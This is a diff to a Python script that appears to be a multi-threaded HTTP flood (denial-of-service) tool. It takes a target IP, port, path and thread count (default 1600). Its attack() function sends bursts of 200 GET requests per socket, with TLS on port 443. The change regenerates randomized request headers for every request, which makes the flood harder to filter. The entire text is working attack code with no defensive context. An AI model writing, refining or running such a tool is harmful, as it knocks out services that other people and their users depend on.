@@ -11,14 +11,10 @@ path = "/"
 threads = 1600
 
 for n,args in enumerate(sys.argv):
-    if args=="-i":
-        ip = str(sys.argv[n+1])
-    if args=="-p":
-        port = int(sys.argv[n+1])
-    if args=="-path":
-        path = str(sys.argv[n+1])
-    if args=="-th":
-        threads = int(sys.argv[n+1])
+    ip = str(sys.argv[1])
+    port = int(sys.argv[2])
+    path = str(sys.argv[3])
+    threads = int(sys.argv[4])
 
 Choice = random.choice
 Intn = random.randint
@@ -92,13 +88,12 @@ def attack():
         get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip + "\r\n"
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
-        request = get_host + rqheader()
-
         if port == 443:
             context = ssl.create_default_context()
             s = context.wrap_socket(s, server_hostname=ip)
         
         for _ in range(200):
+            request = get_host + rqheader()
             s.sendall(request.encode())
         s.close()
 
